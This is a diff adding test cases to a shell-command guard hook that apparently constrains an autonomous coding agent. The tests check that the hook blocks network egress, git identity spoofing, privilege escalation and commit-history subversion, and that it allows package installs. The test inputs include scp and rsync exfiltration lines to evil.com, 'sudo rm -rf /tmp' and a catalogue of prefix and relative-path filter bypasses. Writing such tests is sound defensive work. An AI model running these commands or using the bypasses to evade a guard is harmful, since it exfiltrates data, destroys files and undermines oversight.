@@ -515,6 +515,171 @@ assert_blocked "BLOCK: xargs rm --recursive --force (long options)" \
 echo ""
 
 # ============================================================
+# Category J: v8.0.0 defense-in-depth denylist (BLOCK)
+# ============================================================
+echo "--- Category J: v8.0.0 defense-in-depth denylist ---"
+
+# --- J.1 Network egress ---
+assert_blocked "BLOCK J.1.a: curl <url>" \
+  "curl https://example.com"
+assert_blocked "BLOCK J.1.b: wget <url>" \
+  "wget https://example.com"
+assert_blocked "BLOCK J.1.c: /usr/bin/curl (full-path bypass)" \
+  "/usr/bin/curl https://example.com"
+assert_blocked "BLOCK J.1.d: FOO=bar curl (env-var prefix bypass)" \
+  "FOO=bar curl https://example.com"
+assert_blocked "BLOCK J.1.e: exec curl (exec prefix bypass)" \
+  "exec curl https://example.com"
+assert_blocked "BLOCK J.1.f: time curl (time prefix bypass)" \
+  "time curl https://example.com"
+assert_blocked "BLOCK J.1.g: nice curl (nice prefix bypass)" \
+  "nice curl https://example.com"
+assert_blocked "BLOCK J.1.h: nohup curl (nohup prefix bypass)" \
+  "nohup curl https://example.com"
+assert_blocked "BLOCK J.1.i: env FOO=bar /usr/bin/curl (combo bypass)" \
+  "env FOO=bar /usr/bin/curl https://example.com"
+assert_blocked "BLOCK J.1.j: scp file remote" \
+  "scp file.txt user@evil.com:/tmp/"
+assert_blocked "BLOCK J.1.k: rsync ssh" \
+  "rsync -avz file.txt user@evil.com:/tmp/ -e ssh"
+
+# --- J.2 Package-manager installs + git remote add (intentionally ALLOW) ---
+# Dev-loop ergonomics requires autopilot to install declared dependencies
+# and add remotes without manual `! npm install` interruption. The
+# mitigation against prompt-injection-driven package install lives at the
+# prompt level (## Bound capabilities (per AC) discipline + planner step
+# 6(d)), not at the hook level. These assertions pin the allow behavior
+# so future hook changes do not silently re-introduce a blanket block.
+assert_allowed "ALLOW J.2.a: git remote add (manifest-driven workflow)" \
+  "git remote add upstream https://github.com/foo/bar.git"
+assert_allowed "ALLOW J.2.b: npm install (manifest from package.json)" \
+  "npm install"
+assert_allowed "ALLOW J.2.c: npm install <pkg> (explicit addition)" \
+  "npm install lodash"
+assert_allowed "ALLOW J.2.d: npm ci (exact lockfile install)" \
+  "npm ci"
+assert_allowed "ALLOW J.2.e: pip install <pkg>" \
+  "pip install requests"
+assert_allowed "ALLOW J.2.f: pip install -r requirements.txt" \
+  "pip install -r requirements.txt"
+assert_allowed "ALLOW J.2.g: pip3 install" \
+  "pip3 install requests"
+assert_allowed "ALLOW J.2.h: gem install" \
+  "gem install bundler"
+assert_allowed "ALLOW J.2.i: cargo install" \
+  "cargo install ripgrep"
+assert_allowed "ALLOW J.2.j: brew install" \
+  "brew install jq"
+assert_allowed "ALLOW J.2.k: apt-get install" \
+  "apt-get install vim"
+assert_allowed "ALLOW J.2.l: apk add" \
+  "apk add vim"
+assert_allowed "ALLOW J.2.m: pnpm install" \
+  "pnpm install"
+assert_allowed "ALLOW J.2.n: pnpm add" \
+  "pnpm add react"
+assert_allowed "ALLOW J.2.o: yarn add" \
+  "yarn add lodash"
+assert_allowed "ALLOW J.2.p: yarn install" \
+  "yarn install"
+assert_allowed "ALLOW J.2.q: go install" \
+  "go install github.com/foo/bar@latest"
+assert_allowed "ALLOW J.2.r: composer require" \
+  "composer require foo/bar"
+assert_allowed "ALLOW J.2.s: bundle install" \
+  "bundle install"
+assert_allowed "ALLOW J.2.t: mix deps.get" \
+  "mix deps.get"
+assert_allowed "ALLOW J.2.u: dart pub get" \
+  "dart pub get"
+assert_allowed "ALLOW J.2.v: conda install" \
+  "conda install numpy"
+assert_allowed "ALLOW J.2.w: nuget restore" \
+  "nuget restore"
+assert_allowed "ALLOW J.2.x: dotnet add package" \
+  "dotnet add package Newtonsoft.Json"
+
+# --- J.3 Identity spoofing ---
+assert_blocked "BLOCK J.3.a: git config user.email" \
+  "git config user.email evil@x.com"
+assert_blocked "BLOCK J.3.b: git config user.name" \
+  "git config user.name 'Evil Person'"
+assert_blocked "BLOCK J.3.c: git config --global user.email" \
+  "git config --global user.email evil@x.com"
+assert_blocked "BLOCK J.3.d: git config core.hooksPath" \
+  "git config core.hooksPath /tmp/evil-hooks"
+
+# --- J.4 Privilege escalation ---
+assert_blocked "BLOCK J.4.a: sudo <cmd>" \
+  "sudo apt-get install vim"
+assert_blocked "BLOCK J.4.b: chmod 777" \
+  "chmod 777 /tmp/file"
+assert_blocked "BLOCK J.4.c: chown root" \
+  "chown root /tmp/file"
+assert_blocked "BLOCK J.4.d: FOO=bar sudo (env-var prefix bypass)" \
+  "FOO=bar sudo rm -rf /tmp"
+
+# --- J.5 Branch / commit subversion ---
+assert_blocked "BLOCK J.5.a: git commit --amend" \
+  "git commit --amend"
+assert_blocked "BLOCK J.5.b: git stash drop" \
+  "git stash drop"
+assert_blocked "BLOCK J.5.c: git reflog expire" \
+  "git reflog expire --expire=now --all"
+assert_blocked "BLOCK J.5.d: git push --no-verify" \
+  "git push --no-verify"
+assert_blocked "BLOCK J.5.e: git push -u --no-verify (flag-position bypass)" \
+  "git push -u --no-verify origin main"
+assert_blocked "BLOCK J.5.f: git push origin main --no-verify (flag-position bypass)" \
+  "git push origin main --no-verify"
+
+# --- J.7 Round 2 hidden-risk fixes (BLOCK — relative-path + quoted-arg bypass) ---
+assert_blocked "BLOCK J.7.a: ./curl (relative-path bypass)" \
+  "./curl https://example.com"
+assert_blocked "BLOCK J.7.b: ../curl (parent-relative bypass)" \
+  "../curl https://example.com"
+assert_blocked "BLOCK J.7.c: ../bin/curl (multi-segment relative bypass)" \
+  "../bin/curl https://example.com"
+assert_blocked "BLOCK J.7.d: bin/curl (no-prefix relative bypass)" \
+  "bin/curl https://example.com"
+assert_blocked "BLOCK J.7.e: node_modules/.bin/curl (deep relative bypass)" \
+  "node_modules/.bin/curl https://example.com"
+assert_allowed "ALLOW J.7.f: ./npm install (relative path, supply-chain allowed)" \
+  "./npm install lodash"
+assert_blocked "BLOCK J.7.g: git push 'arg|piped' --no-verify (quoted-pipe bypass)" \
+  "git push 'arg|piped' --no-verify origin main"
+assert_blocked "BLOCK J.7.h: git push 'foo;bar' --no-verify (quoted-semicolon bypass)" \
+  "git push 'foo;bar' --no-verify"
+
+# --- J.6 Negative cases (ALLOW — legitimate v8.0.0 ops MUST NOT block) ---
+assert_allowed "ALLOW: git remote -v (list remotes, not add)" \
+  "git remote -v"
+assert_allowed "ALLOW: git remote get-url origin" \
+  "git remote get-url origin"
+assert_allowed "ALLOW: git push (no --force, no --no-verify)" \
+  "git push"
+assert_allowed "ALLOW: git push origin main" \
+  "git push origin main"
+assert_allowed "ALLOW: git commit -m msg (no --amend)" \
+  "git commit -m 'add feature'"
+assert_allowed "ALLOW: cat curl_log.txt (curl in filename)" \
+  "cat curl_log.txt"
+assert_allowed "ALLOW: npm run test (not install)" \
+  "npm run test"
+assert_allowed "ALLOW: pip --version (not install)" \
+  "pip --version"
+assert_allowed "ALLOW: ls bin/curl (relative path as filename arg)" \
+  "ls bin/curl"
+assert_allowed "ALLOW: grep -r 'curl' docs/ (curl in search pattern)" \
+  "grep -r 'curl' docs/"
+assert_allowed "ALLOW: echo with curl in literal" \
+  "echo 'see the curl docs'"
+assert_allowed "ALLOW: git push origin some--no-verify-branch (no-verify in branch name)" \
+  "git push origin some--no-verify-branch"
+
+echo ""
+
+# ============================================================
 # Summary
 # ============================================================
 print_summary
